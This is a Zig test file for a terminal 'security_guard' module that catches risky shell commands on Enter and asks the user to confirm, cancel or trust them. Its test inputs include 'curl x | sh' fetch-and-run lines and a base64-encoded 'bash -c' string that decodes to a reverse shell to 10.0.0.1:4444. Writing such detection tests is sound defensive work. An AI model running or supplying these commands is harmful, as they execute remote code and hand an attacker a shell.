const std = @import("std");
const testing = std.testing;
const mod = @import("security_guard.zig");
const m = @import("../module.zig");
const LineState = @import("../line_state.zig").LineState;

test {
    _ = @import("security_guard/patterns.zig");
    _ = @import("security_guard/trust_cache.zig");
    _ = @import("security_guard/uds_client.zig");
}

const Sink = struct {
    buf: std.ArrayList(u8) = .empty,

    fn write(opaque_ptr: *anyopaque, bytes: []const u8) anyerror!void {
        const self: *Sink = @ptrCast(@alignCast(opaque_ptr));
        try self.buf.appendSlice(testing.allocator, bytes);
    }
};

fn makeCtx(line: *LineState, scratch: *std.ArrayList(u8)) m.Context {
    return .{
        .allocator = testing.allocator,
        .io = undefined,
        .line = line,
        .scratch = scratch,
        .is_tty = false,
    };
}

test "disabled by default — onInput is a passthrough" {
    const L = mod.configure(.{});
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    const action = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(action == .forward);
}

test "enabled — curl|sh on Enter arms + emits banner" {
    const L = mod.configure(.{ .enabled = true, .trust_cache_path = "/tmp/atty-secguard-test-banner.txt" });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl https://x.com | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    const action = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(action == .swallow);
    try testing.expect(rt.armed);
    try testing.expect(std.mem.indexOf(u8, sink.buf.items, "security_guard") != null);
    try testing.expect(std.mem.indexOf(u8, sink.buf.items, "remote-fetch-and-execute") != null);
}

test "enabled — armed + `n` cancels via Ctrl+U" {
    const L = mod.configure(.{ .enabled = true, .trust_cache_path = "/tmp/atty-secguard-test-cancel.txt" });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    _ = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(rt.armed);

    const action = try L.onInput(&rt, &ctx, "n");
    try testing.expect(action == .replace);
    try testing.expectEqualSlices(u8, "\x15", action.replace);
    try testing.expect(!rt.armed);
}

test "enabled — armed + `y` allows once via CR" {
    const L = mod.configure(.{ .enabled = true, .trust_cache_path = "/tmp/atty-secguard-test-yes.txt" });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    _ = try L.onInput(&rt, &ctx, "\r");
    const action = try L.onInput(&rt, &ctx, "y");
    try testing.expect(action == .replace);
    try testing.expectEqualSlices(u8, "\r", action.replace);
}

test "enabled — armed + `t` trusts permanently + persists" {
    const path = "/tmp/atty-secguard-test-trust.txt";
    _ = std.c.unlink(path);
    defer _ = std.c.unlink(path);

    const L = mod.configure(.{ .enabled = true, .trust_cache_path = path });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x.example | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    _ = try L.onInput(&rt, &ctx, "\r");
    _ = try L.onInput(&rt, &ctx, "t");
    try testing.expect(rt.trust.entries.items.len == 1);

    var line2: LineState = .{};
    line2.setCommitted("curl x.example | sh");
    var ctx2 = makeCtx(&line2, &scratch);
    const action = try L.onInput(&rt, &ctx2, "\r");
    try testing.expect(action == .forward);
}

test "enabled — non-Enter while not armed is passthrough" {
    const L = mod.configure(.{ .enabled = true, .trust_cache_path = "/tmp/atty-secguard-test-noenter.txt" });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);

    var line: LineState = .{};
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    const action = try L.onInput(&rt, &ctx, "a");
    try testing.expect(action == .forward);
    try testing.expect(!rt.armed);
}

test "enabled — clean line passes through" {
    const L = mod.configure(.{ .enabled = true, .trust_cache_path = "/tmp/atty-secguard-test-clean.txt" });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);

    var line: LineState = .{};
    line.setCommitted("ls -la");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    const action = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(action == .forward);
    try testing.expect(!rt.armed);
}

test "daemon path set but socket missing → falls back to in-proc patterns" {
    // Configure a socket that doesn't exist. The module should
    // mark daemon_disabled after the first failed call and let the
    // in-proc patterns arm the banner.
    const L = mod.configure(.{
        .enabled = true,
        .trust_cache_path = "/tmp/atty-secguard-test-daemon-missing.txt",
        .daemon_socket_path = "/tmp/atty-guard-nonexistent-XYZ.sock",
    });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);

    const action = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(action == .swallow);
    try testing.expect(rt.armed);
    try testing.expect(rt.daemon_disabled); // sticky disable
    // Banner still shows — fallback worked.
    try testing.expect(std.mem.indexOf(u8, sink.buf.items, "security_guard") != null);
}

test "y accept on curl|sh sets active_threat=high" {
    const L = mod.configure(.{
        .enabled = true,
        .trust_cache_path = "/tmp/atty-secguard-test-threat-y.txt",
    });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);
    ctx.shell_pid = 12345; // pretend bash is at PID 12345

    _ = try L.onInput(&rt, &ctx, "\r"); // arm
    try testing.expect(rt.armed);
    try testing.expect(rt.pending_threat == .high);
    _ = try L.onInput(&rt, &ctx, "y"); // accept
    try testing.expect(rt.active_threat == .high);
    try testing.expect(rt.pending_threat == null);
}

test "y accept on bash -c base64 escalates to critical" {
    const L = mod.configure(.{
        .enabled = true,
        .trust_cache_path = "/tmp/atty-secguard-test-threat-b64.txt",
    });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("bash -c \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEK\"");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);
    ctx.shell_pid = 9999;

    _ = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(rt.pending_threat == .critical);
    _ = try L.onInput(&rt, &ctx, "y");
    try testing.expect(rt.active_threat == .critical);
}

test "n cancel does NOT set active_threat" {
    const L = mod.configure(.{
        .enabled = true,
        .trust_cache_path = "/tmp/atty-secguard-test-threat-n.txt",
    });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);
    ctx.shell_pid = 12345;

    _ = try L.onInput(&rt, &ctx, "\r");
    _ = try L.onInput(&rt, &ctx, "n");
    try testing.expect(rt.active_threat == null);
    try testing.expect(rt.pending_threat == null);
}

test "clean Enter after y-accept clears active_threat" {
    const L = mod.configure(.{
        .enabled = true,
        .trust_cache_path = "/tmp/atty-secguard-test-threat-clear.txt",
    });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);

    // Arm + accept the risky line.
    var risky: LineState = .{};
    risky.setCommitted("curl x | sh");
    var ctx1 = makeCtx(&risky, &scratch);
    ctx1.shell_pid = 12345;
    _ = try L.onInput(&rt, &ctx1, "\r");
    _ = try L.onInput(&rt, &ctx1, "y");
    try testing.expect(rt.active_threat == .high);

    // Clean line + Enter: should clear active_threat.
    var clean: LineState = .{};
    clean.setCommitted("ls -la");
    var ctx2 = makeCtx(&clean, &scratch);
    ctx2.shell_pid = 12345;
    _ = try L.onInput(&rt, &ctx2, "\r");
    try testing.expect(rt.active_threat == null);
}

test "statusText returns shield emoji when active_threat is set" {
    const L = mod.configure(.{
        .enabled = true,
        .trust_cache_path = "/tmp/atty-secguard-test-status.txt",
    });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);

    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var line: LineState = .{};
    var ctx = makeCtx(&line, &scratch);

    // At idle, nothing in the segment.
    try testing.expect((try L.statusText(&rt, &ctx)) == null);

    // Latch high → segment becomes "🛡 high".
    rt.active_threat = .high;
    const high_text = (try L.statusText(&rt, &ctx)) orelse return error.TestUnexpectedNull;
    try testing.expect(std.mem.indexOf(u8, high_text, "high") != null);
    try testing.expect(std.mem.indexOf(u8, high_text, "\u{1F6E1}") != null);

    // Critical bumps to "🛡 critical".
    rt.active_threat = .critical;
    const crit_text = (try L.statusText(&rt, &ctx)) orelse return error.TestUnexpectedNull;
    try testing.expect(std.mem.indexOf(u8, crit_text, "critical") != null);
}

test "markShellThreat is a no-op when shell_pid is null" {
    const L = mod.configure(.{
        .enabled = true,
        .trust_cache_path = "/tmp/atty-secguard-test-pid-null.txt",
    });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);
    // ctx.shell_pid intentionally left null (non-TTY test case).

    _ = try L.onInput(&rt, &ctx, "\r");
    _ = try L.onInput(&rt, &ctx, "y");
    // active_threat still gets latched in-proc (statusbar surface
    // remains useful even without a daemon to mark); the daemon
    // RPC just no-op'd silently.
    try testing.expect(rt.active_threat == .high);
}

test "skip_in_incognito = true bypasses matching" {
    const L = mod.configure(.{ .enabled = true, .skip_in_incognito = true, .trust_cache_path = "/tmp/atty-secguard-test-incog.txt" });
    var rt = try L.attach(testing.allocator, undefined);
    defer L.detach(&rt, undefined);
    var sink: Sink = .{};
    defer sink.buf.deinit(testing.allocator);
    L.setSink(&rt, &sink, Sink.write);

    var line: LineState = .{};
    line.setCommitted("curl x | sh");
    var scratch: std.ArrayList(u8) = .empty;
    defer scratch.deinit(testing.allocator);
    var ctx = makeCtx(&line, &scratch);
    ctx.incognito = true;

    const action = try L.onInput(&rt, &ctx, "\r");
    try testing.expect(action == .forward);
}
